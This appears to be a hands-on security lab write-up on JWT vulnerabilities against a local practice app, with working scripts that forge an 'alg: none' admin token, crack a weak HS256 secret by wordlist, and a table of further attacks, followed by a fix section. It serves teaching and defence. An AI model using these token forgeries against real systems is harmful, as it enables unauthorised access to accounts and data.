# Lab 10 — Passport

## Reading a JWT before you attack it

```bash
h5i browser open http://127.0.0.1:9100/api/token --session lab10 --new --capture
h5i websec show res_0 --session lab10 --raw
```

Three base64url segments separated by dots. Decode the first two; never trust
the third.

```bash
python3 - <<'PY'
import base64, json, sys
tok = "eyJhbGciOi…"
d = lambda p: base64.urlsafe_b64decode(p + "=" * (-len(p) % 4))
h, b, s = tok.split(".")
print(json.loads(d(h)), json.loads(d(b)), "sig", len(d(s)), "bytes")
PY
```

    {'alg': 'HS256', 'typ': 'JWT'} {'sub': 'guest', 'role': 'guest', 'iss': 'passport'}

**The header is attacker-controlled input that tells the verifier how to check
the token.** Sit with that sentence; it is the source of every JWT bug below.

## Way in #1 — `alg: none`

```python
if alg.lower() == "none":
    return claims
```

JWS defines an `none` algorithm for tokens whose integrity is guaranteed by
some other layer. A verifier that honours it when reading an *inbound* token has
made the signature optional.

```bash
FORGED=$(python3 -c '
import base64,json
b=lambda r:base64.urlsafe_b64encode(r).rstrip(b"=").decode()
p=lambda o:b(json.dumps(o,separators=(",",":")).encode())
print(p({"alg":"none","typ":"JWT"})+"."+p({"sub":"guest","role":"admin","iss":"passport"})+".")')

h5i websec replay req_0 --session lab10 --create --set path=/api/vault \
    --set "header.Authorization=Bearer $FORGED"
```

Note the **trailing dot**. The token is `header.payload.` with an empty third
segment; a library that splits on `.` and expects three parts needs it.

Variants to try when plain `none` is rejected: `None`, `NONE`, `nOnE`
(this app lowercases, many do not), and `{"alg":"none","typ":"JWT"}` with the
signature segment omitted entirely.

## Way in #2 — the secret is a word

```python
SECRET = b"letmein"
```

HS256 tokens are offline-crackable: you hold the signed message and the
signature, so you can test candidate keys as fast as you can HMAC.

```bash
python3 - <<'PY'
import base64, hashlib, hmac
tok = "<the guest token>"
signed, _, sig = tok.rpartition(".")
b = lambda r: base64.urlsafe_b64encode(r).rstrip(b"=").decode()
for word in ["secret","password","changeme","letmein","jwt","key","admin","test"]:
    if b(hmac.new(word.encode(), signed.encode(), hashlib.sha256).digest()) == sig:
        print("secret:", word); break
PY
```

Then mint a properly signed admin token. This is the more valuable finding of
the two: `alg: none` is caught by every modern library, while a weak secret
copied from a tutorial survives for years. Real wordlists: `rockyou.txt`,
`jwt-secrets` lists, and the sample values in the framework's own docs.

## The other JWT bugs, so the checklist is complete

| Bug | Probe |
| --- | --- |
| `alg: none` | above |
| weak HMAC secret | crack it offline |
| RS256 → HS256 confusion | HMAC the token with the server's **public key** as the secret; if `algorithms` is a list containing both, the key argument changes meaning |
| `kid` injection | Lab 11 — path traversal, SQLi, or command injection in the key id |
| `jku` / `x5u` | point the header at a JWKS **you** host; SSRF plus total forgery |
| no expiry check | replay an old token |
| claim confusion | `sub` as an integer vs string; `role` as an array |
| no `aud`/`iss` check | a token from a sibling service is accepted here |

## The fix

Pin the algorithm and the key server-side, before parsing:

```python
claims = jwt.decode(token, key, algorithms=["HS256"], issuer="passport", audience="vault")
```

`algorithms` is a list *you* write, never one derived from the header. Use a
random 256-bit secret from a secret manager. For asymmetric setups keep the
public key out of the verifier's key-lookup path entirely so no `alg` swap can
promote it to an HMAC key. And check `exp`, `iss` and `aud` — a signature only
proves who wrote the token, not that it was written for you.

## h5i technique

`--set header.Authorization=Bearer …` with `--create`, and building the token in
a heredoc rather than a helper library, so nothing is hidden from you.
